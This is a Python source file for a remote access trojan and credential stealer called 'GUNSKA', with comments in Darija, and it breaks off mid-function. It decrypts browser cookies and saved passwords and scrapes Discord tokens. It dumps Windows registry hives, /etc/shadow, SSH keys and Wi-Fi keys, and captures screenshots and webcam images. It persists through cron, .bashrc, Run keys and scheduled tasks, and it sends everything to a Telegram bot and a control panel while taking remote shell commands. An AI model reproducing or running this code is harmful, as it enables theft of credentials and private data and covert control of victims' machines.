#!/usr/bin/env python3
"""GUNSKA agent — HTTPS long-poll, stdlib only. + auto-exfil Telegram/panel."""
import base64
import glob
import hashlib
import json
import os
import platform
import random
import re
import secrets
import shutil
import sqlite3
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
import urllib.parse
import urllib.request

BASE = "__BASE__"
TOKEN = "__TOKEN__"
NAME = "__NAME__"
TG_TOKEN = "__TGTOKEN__"
TG_CHAT = "__TGCHAT__"
TG = bool(TG_TOKEN and TG_CHAT and not TG_TOKEN.startswith("__") and not TG_CHAT.startswith("__"))
POLL = 1.0
CH = 512 * 1024
MAX_EXFIL = 45 * 1024 * 1024
MAX_TAR = 140 * 1024 * 1024
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
SIDF = os.path.join(tempfile.gettempdir(), ".sid")
UPS = {}
DONE = {"auto": False}

TOKRE = re.compile(rb"(mfa\.[\w-]{80,90}|[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,45})")
DQRE = re.compile(rb"dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,900})")


def _sid():
    try:
        s = open(SIDF).read().strip()
        if len(s) == 16:
            return s
    except Exception:
        pass
    s = secrets.token_hex(8)
    try:
        with open(SIDF, "w") as f:
            f.write(s)
    except Exception:
        pass
    return s


SID = _sid()


def http(path, data=None, timeout=40):
    sep = "&" if "?" in path else "?"
    r = urllib.request.Request(BASE + path + sep + "t=" + TOKEN, data=data, headers=UA)
    with urllib.request.urlopen(r, timeout=timeout) as f:
        return f.read()


def post(o, timeout=40, tries=3):
    for i in range(tries):
        try:
            http("/r/" + SID, json.dumps(o).encode(), timeout)
            return True
        except Exception:
            time.sleep(0.4 * (i + 1))
    return False


def out(rid, txt):
    if txt:
        post({"t": "out", "id": rid, "d": txt})


def which(b):
    return shutil.which(b)


def sh(c, t=90):
    try:
        r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
        return (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        return "[timeout]\n"
    except Exception as e:
        return "ERR %s\n" % e


def _cwd():
    try:
        return os.getcwd()
    except Exception:
        return tempfile.gettempdir()


def _selfdir():
    return os.path.dirname(os.path.abspath(__file__))


def _mark():
    """Marker dyal l'installer: kayt3ref bih belli python naffed l'script."""
    try:
        with open(os.path.join(_selfdir(), ".live"), "w") as f:
            f.write("%d" % int(time.time()))
    except Exception:
        pass


def _pyexe():
    d = _selfdir()
    for n in ("python.exe", "python"):
        p = os.path.join(d, n)
        if os.path.isfile(p):
            return p
    return sys.executable


def _is_admin():
    if os.name != "nt":
        try:
            return os.geteuid() == 0
        except Exception:
            return False
    try:
        import ctypes
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def info():
    d = {"host": platform.node(), "os": platform.platform(), "arch": platform.machine(),
         "user": os.environ.get("USER") or os.environ.get("USERNAME") or "?",
         "cwd": _cwd(), "pid": os.getpid(), "python": sys.version.split()[0],
         "admin": _is_admin(),
         "termux": os.environ.get("PREFIX", "").startswith("/data/data/com.termux")}
    try:
        s = __import__("socket").socket(2, 2)
        s.connect(("8.8.8.8", 80))
        d["ip"] = s.getsockname()[0]
        s.close()
    except Exception:
        d["ip"] = "?"
    if os.name == "nt":
        try:
            d["av"] = sh('powershell -NoProfile -w hidden -c '
                         '"(Get-CimInstance -Namespace root/SecurityCenter2 '
                         '-ClassName AntiVirusProduct).displayName" -join ", "', t=30).strip()[:120]
        except Exception:
            d["av"] = ""
    return d


# ---------------------------------------------------------------- telegram
def tg_text(txt):
    if not TG:
        return False
    try:
        data = urllib.parse.urlencode({"chat_id": TG_CHAT, "text": txt[:3800],
                                       "disable_web_page_preview": "true"}).encode()
        r = urllib.request.Request("https://api.telegram.org/bot%s/sendMessage" % TG_TOKEN,
                                   data=data, headers=UA)
        urllib.request.urlopen(r, timeout=40).read()
        return True
    except Exception:
        return False


def tg_doc(path, caption=""):
    if not TG:
        return False
    try:
        if os.path.getsize(path) > 48 * 1024 * 1024:
            return False
        bnd = "----g" + secrets.token_hex(8)
        pre = []
        for k, v in (("chat_id", TG_CHAT), ("caption", caption[:900])):
            if v:
                pre.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
                            % (bnd, k, v)).encode())
        body = b"".join(pre)
        body += ("--%s\r\nContent-Disposition: form-data; name=\"document\"; filename=\"%s\"\r\n"
                 "Content-Type: application/octet-stream\r\n\r\n"
                 % (bnd, os.path.basename(path).replace('"', "_"))).encode()
        with open(path, "rb") as f:
            body += f.read()
        body += ("\r\n--%s--\r\n" % bnd).encode()
        r = urllib.request.Request("https://api.telegram.org/bot%s/sendDocument" % TG_TOKEN,
                                   data=body,
                                   headers={"Content-Type": "multipart/form-data; boundary=" + bnd,
                                            "User-Agent": UA["User-Agent"]})
        urllib.request.urlopen(r, timeout=240).read()
        return True
    except Exception:
        return False


# ---------------------------------------------------------------- crypto
def _dpapi(blob):
    """CryptUnprotectData — Windows only. L'blob kayji base64-decoded 9bel."""
    if os.name != "nt" or not blob:
        return None
    import ctypes
    from ctypes import wintypes

    class BLOB(ctypes.Structure):
        _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

    def mk(b):
        buf = ctypes.create_string_buffer(b, len(b))
        return BLOB(len(b), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char))), buf

    bi, _keep = mk(blob)
    bo = BLOB()
    if not ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
        return None
    data = ctypes.string_at(bo.pbData, bo.cbData)
    ctypes.windll.kernel32.LocalFree(bo.pbData)
    return data


_SBOX = bytes.fromhex(
    "637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0"
    "b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b275"
    "09832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cf"
    "d0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2"
    "cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdb"
    "e0323a0a4906245cc2d3ac629195e479e7c8376d8dd54ea96c56f4ea657aae08"
    "ba78252e1ca6b4c6e8dd741f4bbd8b8a703eb5664803f60e613557b986c11d9e"
    "e1f8981169d98e949b1e87e9ce5528df8ca1890dbfe6426841992d0fb054bb16")


def _xt(a):
    return ((a << 1) ^ 0x1b) & 0xff if a & 0x80 else a << 1


def _expand(key):
    nk, nr = len(key) // 4, len(key) // 4 + 6
    w = [list(key[4 * i:4 * i + 4]) for i in range(nk)]
    rc = 1
    for i in range(nk, 4 * (nr + 1)):
        t = list(w[i - 1])
        if i % nk == 0:
            t = [_SBOX[b] for b in t[1:] + t[:1]]
            t[0] ^= rc
            rc = _xt(rc)
        elif nk > 6 and i % nk == 4:
            t = [_SBOX[b] for b in t]
        w.append([w[i - nk][j] ^ t[j] for j in range(4)])
    return w, nr


def _ark(s, w, r):
    for i in range(16):
        s[i] ^= w[4 * r + i // 4][i % 4]


def _shift(s):
    for row in range(1, 4):
        idx = [row + 4 * c for c in range(4)]
        v = [s[x] for x in idx]
        v = v[row:] + v[:row]
        for c in range(4):
            s[idx[c]] = v[c]


def _mix(s):
    for c in range(4):
        i = 4 * c
        a = s[i:i + 4]
        t = a[0] ^ a[1] ^ a[2] ^ a[3]
        s[i] = a[0] ^ t ^ _xt(a[0] ^ a[1])
        s[i + 1] = a[1] ^ t ^ _xt(a[1] ^ a[2])
        s[i + 2] = a[2] ^ t ^ _xt(a[2] ^ a[3])
        s[i + 3] = a[3] ^ t ^ _xt(a[3] ^ a[0])


def _enc(block, w, nr):
    s = list(block)
    _ark(s, w, 0)
    for r in range(1, nr):
        for i in range(16):
            s[i] = _SBOX[s[i]]
        _shift(s)
        _mix(s)
        _ark(s, w, r)
    for i in range(16):
        s[i] = _SBOX[s[i]]
    _shift(s)
    _ark(s, w, nr)
    return bytes(s)


def _ctr(key, nonce, data):
    w, nr = _expand(key)
    o = bytearray()
    c = 1
    for i in range(0, len(data), 16):
        ks = _enc(nonce + c.to_bytes(4, "big"), w, nr)
        o += bytes(x ^ y for x, y in zip(data[i:i + 16], ks))
        c += 1
    return bytes(o)


def _dec(val, key, host=""):
    """Chrome v10/v11/v20 blob (cookie / password) -> clear text."""
    if isinstance(val, str):
        return val
    if not val:
        return ""
    if val[:3] in (b"v10", b"v11", b"v20"):
        if not key or len(val) < 32:
            return ""
        try:
            p = _ctr(key, val[3:15], val[15:-16])
        except Exception:
            return ""
        if host and p[:32] == hashlib.sha256(host.encode()).digest():
            p = p[32:]
        return p.decode("utf-8", "replace")
    return val.decode("utf-8", "replace")


def _master_key():
    if os.name != "nt":
        return None
    la = os.environ.get("LOCALAPPDATA", "")
    for b in (la + "\\Google\\Chrome\\User Data",
              la + "\\Microsoft\\Edge\\User Data",
              la + "\\BraveSoftware\\Brave-Browser\\User Data"):
        p = os.path.join(b, "Local State")
        if not os.path.isfile(p):
            continue
        try:
            j = json.load(open(p, encoding="utf-8"))
            k = _dpapi(base64.b64decode(j["os_crypt"]["encrypted_key"])[5:])
            if k:
                return k
        except Exception:
            pass
    return None


# ---------------------------------------------------------------- paths
def _browsers():
    h = os.path.expanduser("~")
    res = []
    if os.name == "nt":
        la = os.environ.get("LOCALAPPDATA", "")
        ra = os.environ.get("APPDATA", "")
        bases = [("chrome", la + "\\Google\\Chrome\\User Data"),
                 ("edge", la + "\\Microsoft\\Edge\\User Data"),
                 ("brave", la + "\\BraveSoftware\\Brave-Browser\\User Data"),
                 ("vivaldi", la + "\\Vivaldi\\User Data"),
                 ("yandex", la + "\\Yandex\\YandexBrowser\\User Data"),
                 ("opera", ra + "\\Opera Software\\Opera Stable"),
                 ("operagx", ra + "\\Opera Software\\Opera GX Stable")]
    elif sys.platform == "darwin":
        a = h + "/Library/Application Support"
        bases = [("chrome", a + "/Google/Chrome"), ("edge", a + "/Microsoft Edge"),
                 ("brave", a + "/BraveSoftware/Brave-Browser"), ("vivaldi", a + "/Vivaldi"),
                 ("opera", a + "/com.operasoftware.Opera")]
    else:
        c = h + "/.config"
        bases = [("chrome", c + "/google-chrome"), ("chromium", c + "/chromium"),
                 ("brave", c + "/BraveSoftware/Brave-Browser"),
                 ("edge", c + "/microsoft-edge"), ("vivaldi", c + "/vivaldi"),
                 ("opera", c + "/opera"),
                 ("android_chrome", "/data/data/com.android.chrome/app_chrome/Default")]
    for lbl, b in bases:
        if not os.path.isdir(b):
            continue
        if os.path.isdir(os.path.join(b, "Default")):
            for p in sorted(glob.glob(os.path.join(b, "Default")) +
                            glob.glob(os.path.join(b, "Profile *"))):
                if os.path.isdir(p):
                    res.append((lbl + "_" + os.path.basename(p).replace(" ", ""), p))
        else:
            res.append((lbl, b))
    return res


def _discord():
    h = os.path.expanduser("~")
    if os.name == "nt":
        ra = os.environ.get("APPDATA", "")
        la = os.environ.get("LOCALAPPDATA", "")
        c = [os.path.join(ra, x) for x in ("discord", "discordcanary", "discordptb", "Lightcord")]
        c += [os.path.join(la, x) for x in ("Discord", "DiscordCanary", "DiscordPTB")]
    elif sys.platform == "darwin":
        a = h + "/Library/Application Support"
        c = [a + "/" + x for x in ("discord", "discordcanary", "discordptb", "Lightcord")]
    else:
        c = [h + "/.config/" + x for x in ("discord", "discordcanary", "discordptb", "Lightcord")]
        c += ["/data/data/com.discord/files"]
    return [p for p in c if os.path.isdir(p)]


def _rootcopy(src, dst):
    try:
        shutil.copy2(src, dst)
        return True
    except Exception:
        pass
    if os.name == "nt":
        sh('cmd /c copy /y /b "%s" "%s" >nul 2>&1' % (src, dst), t=30)
        if os.path.exists(dst):
            return True
    if which("su"):
        sh("su -c 'cp \"%s\" \"%s\"' 2>/dev/null" % (src, dst), t=25)
        return os.path.exists(dst)
    return False


# ---------------------------------------------------------------- harvest
def _cookies(d):
    key = _master_key()
    reps = []
    for lbl, prof in _browsers():
        db = None
        for c in ("Network/Cookies", "Cookies"):
            p = os.path.join(prof, c)
            if os.path.isfile(p):
                db = p
                break
        if not db:
            continue
        cp = os.path.join(tempfile.gettempdir(), "ck_%s.db" % secrets.token_hex(4))
        if not _rootcopy(db, cp):
            continue
        rows = ["# %s  %s" % (lbl, db)]
        try:
            con = sqlite3.connect(cp)
            for host, name, val, enc in con.execute(
                    "SELECT host_key,name,value,encrypted_value FROM cookies"):
                v = _dec(enc, key, host) if enc else (val or "")
                if v:
                    rows.append("%s\t%s\t%s" % (host, name, v))
            con.close()
        except Exception as e:
            rows.append("# err %s" % e)
        try:
            shutil.copy2(cp, os.path.join(d, "raw_%s_%s" % (lbl, os.path.basename(db))))
        except Exception:
            pass
        if len(rows) > 1:
            p = os.path.join(d, "cookies_%s.txt" % lbl)
            open(p, "w", encoding="utf-8", errors="replace").write("\n".join(rows))
            reps.append(p)
        try:
            os.remove(cp)
        except Exception:
            pass
    return reps


def _passwords(d):
    key = _master_key()
    reps = []
    for lbl, prof in _browsers():
        db = os.path.join(prof, "Login Data")
        if not os.path.isfile(db):
            continue
        cp = os.path.join(tempfile.gettempdir(), "lg_%s.db" % secrets.token_hex(4))
        if not _rootcopy(db, cp):
            continue
        rows = ["# %s" % db]
        try:
            con = sqlite3.connect(cp)
            for url, user, pw in con.execute(
                    "SELECT origin_url,username_value,password_value FROM logins"):
                p = _dec(pw, key)
                if user or p:
                    rows.append("%s\t%s\t%s" % (url, user, p))
            con.close()
        except Exception as e:
            rows.append("# err %s" % e)
        if len(rows) > 1:
            p = os.path.join(d, "passwords_%s.txt" % lbl)
            open(p, "w", encoding="utf-8", errors="replace").write("\n".join(rows))
            reps.append(p)
        try:
            os.remove(cp)
        except Exception:
            pass
    return reps


def _tokens(d, deep=False):
    """Discord tokens: leveldb (plain + DPAPI dQw4w9WgXcQ) + browser leveldb."""
    found = set()
    dirs = [os.path.join(prof, "Local Storage", "leveldb") for _l, prof in _browsers()]
    dirs += [os.path.join(b, "Local Storage", "leveldb") for b in _discord()]
    for src in dirs:
        if not os.path.isdir(src):
            continue
        for fn in glob.glob(os.path.join(src, "*")):
            if not os.path.isfile(fn) or os.path.getsize(fn) > 12 * 1024 * 1024:
                continue
            try:
                blob = open(fn, "rb").read()
            except Exception:
                continue
            for m in TOKRE.finditer(blob):
                found.add(m.group(1).decode("utf-8", "replace"))
            for m in DQRE.finditer(blob):
                try:
                    raw = _dpapi(base64.b64decode(m.group(1) + b"=" * (-len(m.group(1)) % 4)))
                except Exception:
                    raw = None
                if not raw:
                    continue
                try:
                    txt = raw.decode("utf-8", "replace")
                except Exception:
                    continue
                mm = TOKRE.search(txt.encode())
                if mm:
                    found.add(mm.group(1).decode())
    if not found:
        return []
    p = os.path.join(d, "discord_tokens.txt")
    open(p, "w").write("\n".join(sorted(found)))
    reps = [p]
    if deep:
        for b in _discord():
            for sub in ("Local Storage/leveldb",):
                src = os.path.join(b, sub)
                if not os.path.isdir(src):
                    continue
                dst = os.path.join(d, "ldb_" + os.path.basename(b) + "_" + secrets.token_hex(3))
                try:
                    shutil.copytree(src, dst)
                    reps.append(dst)
                except Exception:
                    pass
        for b in _discord():
            for n in ("settings.json", "Local State"):
                p2 = os.path.join(b, n)
                if os.path.isfile(p2):
                    try:
                        shutil.copy2(p2, os.path.join(d, os.path.basename(b) + "_" + n))
                        reps.append(os.path.join(d, os.path.basename(b) + "_" + n))
                    except Exception:
                        pass
    return reps


def _hash(d):
    """SAM/SYSTEM/SECURITY hives + local creds (cmdkey, autologon, privs)."""
    if os.name != "nt":
        return _unix_creds(d)
    got = []
    rep = os.path.join(d, "creds_local.txt")
    body = ["# host %s user %s admin %s" % (platform.node(), os.environ.get("USERNAME", "?"), _is_admin())]
    body.append("\n## cmdkey /list\n" + sh("cmdkey /list", t=40))
    body.append("\n## autologon\n" + sh(
        'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"', t=40))
    body.append("\n## whoami /priv\n" + sh("whoami /priv", t=40))
    body.append("\n## local users\n" + sh("net user", t=40))
    open(rep, "w", encoding="utf-8", errors="replace").write("\n".join(body))
    got.append(rep)
    for h in ("sam", "system", "security"):
        p = os.path.join(d, "hive_" + h)
        sh('reg save hklm\\%s "%s" /y' % (h, p), t=90)
        if os.path.isfile(p) and os.path.getsize(p) > 1024:
            got.append(p)
        else:
            try:
                os.remove(p)
            except Exception:
                pass
    return got


def _unix_creds(d):
    got = []
    for name, cmd in (("shadow.txt", "cat /etc/shadow 2>/dev/null || sudo -n cat /etc/shadow 2>/dev/null"),
                      ("passwd.txt", "cat /etc/passwd 2>/dev/null"),
                      ("sudoers.txt", "cat /etc/sudoers 2>/dev/null || sudo -n cat /etc/sudoers 2>/dev/null")):
        body = sh(cmd, t=40)
        if body.strip():
            p = os.path.join(d, name)
            open(p, "w", encoding="utf-8", errors="replace").write(body)
            got.append(p)
    for f in ("id_rsa", "id_ed25519", "id_ecdsa", "known_hosts", "authorized_keys"):
        p = os.path.join(os.path.expanduser("~"), ".ssh", f)
        if os.path.isfile(p):
            try:
                shutil.copy2(p, os.path.join(d, "ssh_" + f))
                got.append(os.path.join(d, "ssh_" + f))
            except Exception:
                pass
    return got


def _wifi(d):
    body = ""
    if os.name == "nt":
        names = sh("netsh wlan show profiles", t=30)
        for ln in names.splitlines():
            if ":" not in ln:
                continue
            ssid = ln.split(":", 1)[1].strip()
            if not ssid or "Profile" in ssid or "profil" in ssid.lower():
                continue
            o = sh('netsh wlan show profile name="%s" key=clear' % ssid.replace('"', ""), t=25)
            m = re.search(r"(?:Key Content|Contenu de la cl)[^:]*:\s*(.+)", o)
            body += "%s\t%s\n" % (ssid, m.group(1).strip() if m else "-")
    else:
        body = sh("cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null || "
                  "sudo -n cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null || "
                  "cat /data/misc/wifi/*.conf 2>/dev/null", t=40)
    if not body.strip():
        return []
    p = os.path.join(d, "wifi.txt")
    open(p, "w", encoding="utf-8", errors="replace").write(body)
    return [p]


def _add_capped(tf, src, arc, budget, per_file=25 * 1024 * 1024):
    for root, _dirs, files in os.walk(src):
        for f in files:
            p = os.path.join(root, f)
            try:
                sz = os.path.getsize(p)
            except Exception:
                continue
            if sz > per_file or budget[0] + sz > MAX_TAR:
                continue
            try:
                tf.add(p, arcname=os.path.join(arc, os.path.relpath(p, src)))
                budget[0] += sz
            except Exception:
                pass


def harvest(rid=None, mode="all"):
    d = tempfile.mkdtemp(prefix="ex_")
    got = []
    tp = None
    try:
        if mode in ("all", "cookies"):
            got += _cookies(d)
        if mode in ("all", "passwords"):
            got += _passwords(d)
        if mode in ("all", "tokens"):
            got += _tokens(d)
        if mode == "discord":
            got += _tokens(d, deep=True)
        if mode in ("all", "hashes"):
            got += _hash(d)
        if mode in ("all", "wifi"):
            got += _wifi(d)

        i = info()
        sum_txt = ("host: %s\nuser: %s\nos: %s\nip: %s\nadmin: %s\nfiles: %d\n"
                   % (i["host"], i["user"], i["os"], i["ip"], i["admin"], len(got)))
        sp = os.path.join(d, "summary.txt")
        open(sp, "w").write(sum_txt)
        if rid:
            out(rid, "[exfil] %s\n" % sum_txt.replace("\n", " | "))

        tp = os.path.join(tempfile.gettempdir(), "ex_%d.tar.gz" % time.time())
        with tarfile.open(tp, "w:gz") as tf:
            for p in got:
                try:
                    tf.add(p, arcname=os.path.basename(p))
                except Exception:
                    pass
            tf.add(sp, arcname="summary.txt")
        size = os.path.getsize(tp)
        cap = "%s / %s / %s" % (i["host"], i["user"], i["ip"])

        sent = False
        if TG and size <= MAX_EXFIL:
            sent = tg_doc(tp, cap)
        if not sent and TG:
            for p in got[:12]:
                tg_doc(p, cap)
            tg_text("%s\n%s" % (cap, sum_txt))
            sent = True
        # fallback (wla l'operateur mconnecté): sift l'panel
        if not sent or (rid and size <= 25 * 1024 * 1024):
            send_file(rid, tp)
        elif rid:
            out(rid, "[exfil] tar %d b — l'panel kayqbel ghir 25MB, sta3mel .grab\n" % size)
    except Exception as e:
        if rid:
            out(rid, "ERR exfil %s\n" % e)
    finally:
        if tp and os.path.exists(tp):
            try:
                os.remove(tp)
            except Exception:
                pass
        shutil.rmtree(d, ignore_errors=True)


def auto_exfil():
    if DONE["auto"]:
        return
    DONE["auto"] = True
    time.sleep(5)
    harvest(None, "all")


def screen():
    p = os.path.join(tempfile.gettempdir(), "s_%d.png" % time.time())
    for t in (["screencap", "-p", p], ["scrot", "-z", p], ["import", "-window", "root", p],
              ["gnome-screenshot", "-f", p], ["spectacle", "-b", "-n", "-o", p],
              ["screencapture", "-x", p]):
        if which(t[0]):
            try:
                subprocess.run(t, capture_output=True, timeout=40)
            except Exception:
                pass
            if os.path.exists(p) and os.path.getsize(p) > 0:
                return p
    if os.name == "nt":
        ps = ("Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
              "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
              "$i=New-Object Drawing.Bitmap $b.Width,$b.Height;"
              "$g=[Drawing.Graphics]::FromImage($i);"
              "$g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size);"
              "$i.Save('%s')" % p.replace("\\", "\\\\"))
        try:
            subprocess.run(["powershell", "-NoProfile", "-w", "hidden", "-Command", ps],
                           capture_output=True, timeout=60)
        except Exception:
            pass
        if os.path.exists(p) and os.path.getsize(p) > 0:
            return p
    return None


def _dshow_dev():
    try:
        o = sh('ffmpeg -hide_banner -list_devices true -f dshow -i dummy', t=25)
        m = re.search(r'"([^"]+)"\s*\(video\)', o)
        if m:
            return m.group(1)
    except Exception:
        pass
    return None


def cam():
    p = os.path.join(tempfile.gettempdir(), "c_%d.jpg" % time.time())
    for t in (["termux-camera-photo", "-c", "0", p], ["fswebcam", "-q", "--no-banner", p],
              ["ffmpeg", "-y", "-f", "v4l2", "-i", "/dev/video0", "-frames:v", "1", p],
              ["imagesnap", "-q", p]):
        if which(t[0]):
            try:
                subprocess.run(t, capture_output=True, timeout=40)
            except Exception:
                pass
            if os.path.exists(p) and os.path.getsize(p) > 0:
                return p
    if os.name == "nt" and which("ffmpeg"):
        dev = _dshow_dev()
        if dev:
            try:
                subprocess.run(["ffmpeg", "-y", "-f", "dshow", "-i", "video=" + dev,
                                "-frames:v", "1", p], capture_output=True, timeout=60)
            except Exception:
                pass
            if os.path.exists(p) and os.path.getsize(p) > 0:
                return p
    return None


def send_file(rid, path):
    try:
        size = os.path.getsize(path)
    except Exception as e:
        out(rid, "ERR %s\n" % e)
        return False
    fid = secrets.token_hex(6)
    name = os.path.basename(path)
    out(rid, "[file] %s (%d b)\n" % (name, size))
    i = 0
    with open(path, "rb") as f:
        while True:
            b = f.read(CH)
            if not b:
                break
            ok = post({"t": "file", "id": rid, "fid": fid, "name": name, "i": i,
                       "d": base64.b64encode(b).decode(), "last": False})
            if not ok:
                out(rid, "[file] chunk %d fchel\n" % i)
                return False
            i += 1
    post({"t": "file", "id": rid, "fid": fid, "name": name, "i": i, "last": True, "size": size})
    return True


def _tmp(prefix):
    fd, p = tempfile.mkstemp(prefix=prefix)
    os.close(fd)
    return p


def persist():
    home = os.path.expanduser("~")
    self_path = os.path.abspath(__file__)
    cmd = "%s %s" % (_pyexe(), self_path)
    done = []

    boot_dir = os.path.join(home, ".termux", "boot")
    if os.path.isdir(os.path.join(home, ".termux")):
        os.makedirs(boot_dir, exist_ok=True)
        p = os.path.join(boot_dir, "svc.sh")
        with open(p, "w") as f:
            f.write("#!/data/data/com.termux/files/usr/bin/sh\n"
                    "termux-wake-lock\nnohup %s >/dev/null 2>&1 &\n" % cmd)
        os.chmod(p, 0o755)
        done.append("termux-boot")

    if which("crontab"):
        line = "@reboot nohup %s >/dev/null 2>&1 & # gunska" % cmd
        current = sh("crontab -l 2>/dev/null")
        if line not in current:
            tmp = _tmp("gs_cron")
            with open(tmp, "w") as f:
                f.write(current.rstrip("\n") + "\n" + line + "\n")
            sh("crontab %s" % tmp)
            os.remove(tmp)
            done.append("cron")

    rc = os.path.join(home, ".bashrc")
    if os.path.exists(rc):
        try:
            body = open(rc, encoding="utf-8", errors="replace").read()
        except Exception:
            body = ""
        if "gunska" not in body:
            with open(rc, "a") as f:
                f.write("\n# gunska\n(pgrep -f '%s' >/dev/null 2>&1 || nohup %s >/dev/null 2>&1 &)\n"
                        % (os.path.basename(self_path), cmd))
            done.append("bashrc")

    if os.name == "nt":
        base = os.environ.get("LOCALAPPDATA") or tempfile.gettempdir()
        d = os.path.join(base, "svc")
        os.makedirs(d, exist_ok=True)
        run = os.path.join(d, "run.cmd")
        with open(run, "w") as f:
            f.write('@echo off\r\nstart "" "%s" "%s"\r\n' % (_pyexe(), self_path))
        vbs = os.path.join(d, "run.vbs")
        with open(vbs, "w") as f:
            f.write('CreateObject("WScript.Shell").Run """%s"" ""%s""", 0, False\r\n'
                    % (_pyexe(), self_path))
        sh('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysSvc '
           '/t REG_SZ /d "wscript.exe //nologo \\"%s\\"" /f' % vbs)
        sh('schtasks /create /tn SysSvc /tr "wscript.exe //nologo \\"%s\\"" /sc onlogon /f' % vbs)
        done.append("run-key")
    return ", ".join(done) or "none"


def unpersist():
    home = os.path.expanduser("~")
    self_base = os.path.basename(os.path.abspath(__file__))
    done = []

    p = os.path.join(home, ".termux", "boot", "svc.sh")
    if os.path.exists(p):
        try:
            os.remove(p)
            done.append("boot")
        except Exception:
            pass

    if which("crontab"):
        current = sh("crontab -l 2>/dev/null")
        keep = [l for l in current.splitlines()
                if "gunska" not in l and "svc.sh" not in l and self_base not in l]
        if len(keep) != len(current.splitlines()):
            tmp = _tmp("gs_cron")
            with open(tmp, "w") as f:
                f.write("\n".join(keep) + "\n")
            sh("crontab %s" % tmp)
            os.remove(tmp)
            done.append("cron")

    rc = os.path.join(home, ".bashrc")
    if os.path.exists(rc):
        try:
            lines = open(rc, encoding="utf-8", errors="replace").read().splitlines()
        except Exception:
            lines = []
        keep = [l for l in lines if "# gunska" not in l and self_base not in l]
        if len(keep) != len(lines):
            with open(rc, "w") as f:
                f.write("\n".join(keep) + "\n")
            done.append("bashrc")

    if os.name == "nt":
        sh('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysSvc /f')
        sh("schtasks /delete /tn SysSvc /f")
        for base in (os.environ.get("LOCALAPPDATA") or "", tempfile.gettempdir()):
            for n in ("run.cmd", "run.vbs"):
                try:
                    os.remove(os.path.join(base, "svc", n))
                except Exception:
                    pass
        done.append("run-key")

    return ", ".join(done) or "none"


def run_shell(rid, cmd, limit=120):
    try:
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             stdin=subprocess.DEVNULL, cwd=_cwd())
    except Exception as e:
        out(rid, "ERR %s\n" % e)
        return

    buf = []
    killed = {"v": False}

    def flush():
        if buf:
            out(rid, "".join(buf))
            buf.clear()

    def killer():
        killed["v"] = True
        try:
            p.kill()
        except Exception:
            pass

    tm = threading.Timer(limit, killer)
    tm.start()
    last = time.time()
    try:
        for ln in iter(p.stdout.readline, b""):
            buf.append(ln.decode("utf-8", "replace"))
            if len(buf) >= 20 or time.time() - last > 0.4:
                flush()
                last = time.time()
    finally:
        tm.cancel()
        try:
            p.wait(timeout=5)
        except Exception:
            pass
        flush()
    if killed["v"]:
        out(rid, "\n[timeout %ds]\n" % limit)
    out(rid, "\n[rc=%s]\n" % p.returncode)


def handle(m):
    t = m.get("t")
    rid = m.get("id")
    a = m.get("a") or ""

    if t == "noop":
        return

    if t == "shell":
        run_shell(rid, a)

    elif t == "py":
        b = {}
        try:
            exec(compile(a, "<r>", "exec"), b)
            out(rid, str(b.get("r", "")) + "\n")
        except Exception:
            import traceback
            out(rid, traceback.format_exc())

    elif t == "cd":
        try:
            os.chdir(os.path.expanduser(a))
            out(rid, os.getcwd() + "\n")
        except Exception as e:
            out(rid, "ERR %s\n" % e)

    elif t == "pwd":
        out(rid, _cwd() + "\n")

    elif t == "ls":
        tg = a or "."
        out(rid, sh('dir "%s"' % tg) if os.name == "nt" else
            sh("ls -la --color=never '%s'" % tg.replace("'", "'\\''")))

    elif t == "get":
        send_file(rid, os.path.expanduser(a))

    elif t == "grab":
        src = os.path.expanduser(a or ".")
        tmp = os.path.join(tempfile.gettempdir(), "g_%d.tar.gz" % time.time())
        try:
            with tarfile.open(tmp, "w:gz") as tf:
                tf.add(src, arcname=os.path.basename(os.path.abspath(src)))
            send_file(rid, tmp)
        except Exception as e:
            out(rid, "ERR %s\n" % e)
        finally:
            if os.path.exists(tmp):
                os.remove(tmp)

    elif t == "steal":
        home = os.path.expanduser("~")
        names = ["Desktop", "Documents", "Downloads", "Pictures", "DCIM", "Movies", "Music"]
        tmp = os.path.join(tempfile.gettempdir(), "st_%d.tar.gz" % time.time())
        budget = [0]
        try:
            with tarfile.open(tmp, "w:gz") as tf:
                for n in names:
                    p = os.path.join(home, n)
                    if os.path.isdir(p):
                        _add_capped(tf, p, n, budget)
                for b in _discord():
                    s = os.path.join(b, "Local Storage")
                    if os.path.isdir(s):
                        _add_capped(tf, s, "discord/" + os.path.basename(b), budget)
                for _l, prof in _browsers():
                    s = os.path.join(prof, "Local Storage")
                    if os.path.isdir(s):
                        _add_capped(tf, s, "browser/" + os.path.basename(prof), budget)
            out(rid, "[steal] %d b\n" % os.path.getsize(tmp))
            send_file(rid, tmp)
        except Exception as e:
            out(rid, "ERR %s\n" % e)
        finally:
            if os.path.exists(tmp):
                os.remove(tmp)

    elif t == "info":
